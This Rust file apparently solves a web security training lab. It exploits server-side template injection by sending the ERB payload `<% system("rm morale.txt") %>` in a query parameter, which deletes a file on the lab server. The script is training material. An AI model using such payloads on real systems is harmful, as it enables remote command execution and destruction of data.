/************************************************************************
*
* Lab: Basic server-side template injection
*
* Hack Steps:
*      1. Fetch the main page with the injected payload in the message
*         query parameter
*      2. Observe that the morale.txt file is successfully deleted
*
*************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0acc004703c4768880f8b7ba00b60084.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "message".yellow());
    print!("❯❯ Fetching the main page with the injected payload.. ");
    io::stdout().flush().unwrap();

    let client = build_web_client();
    let payload = r###"<% system("rm morale.txt") %>"###;
    client
        .get(format!("{LAB_URL}/?message={payload}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the main page".red()));

    println!("{}", "OK".green());
    println!("🗹 The morale.txt file is successfully deleted");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
